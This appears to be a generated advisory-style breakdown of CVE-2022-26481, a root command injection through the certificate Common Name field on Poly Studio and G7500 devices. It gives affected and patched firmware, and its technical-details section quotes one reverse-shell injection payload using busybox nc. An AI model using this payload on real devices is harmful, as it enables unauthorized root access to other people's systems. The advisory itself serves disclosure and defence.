Based on the provided content, here's a breakdown of the vulnerability:

**CVE ID:** CVE-2022-26481

**Root Cause of Vulnerability:**
The vulnerability stems from insufficient input sanitization in the web interface when creating a certificate. Specifically, the "Common Name (CN)" field within the Certificate Details form is vulnerable to command injection.

**Weaknesses/Vulnerabilities Present:**
- **Authenticated Command Injection:** An attacker can inject arbitrary operating system commands through the "Common Name" field during the creation of a Certificate Signing Request (CSR).
- **Elevated Privileges:** The injected commands are executed with root privileges on the device.

**Impact of Exploitation:**
- **Full System Compromise:** An attacker can achieve complete control over the vulnerable device by executing arbitrary commands with root privileges. This could lead to data exfiltration, denial of service, or further malicious activities within the network.

**Attack Vectors:**
- **Web Interface:** The vulnerability is exploited through the web interface of the Poly devices. Specifically, the "Security > Certificates" section.
- **Certificate Signing Request (CSR):** The "Common Name" field within the CSR form is the injection point.

**Required Attacker Capabilities/Position:**
- **Authentication:** The attacker must be authenticated to access the web interface of the Poly device.
- **Network Access:** The attacker needs network connectivity to the device to interact with the web interface.

**Technical Details:**
- The attacker injects a command within the `Common Name (CN)` field using the syntax `$(command)`. In the provided proof of concept, the attacker used `$(busybox nc 10.0.0.1 8888 -e /system/bin/sh)` to establish a reverse shell connection back to the attacker's machine.

**Affected Products/Versions:**
- Poly Studio X30
- Poly Studio X50
- Poly Studio X70
- G7500
- Firmware versions 3.4.0-292042, 3.5.0-344025, and 3.6.0.

**Patched Version:**
- Firmware version 3.7.0 and higher.
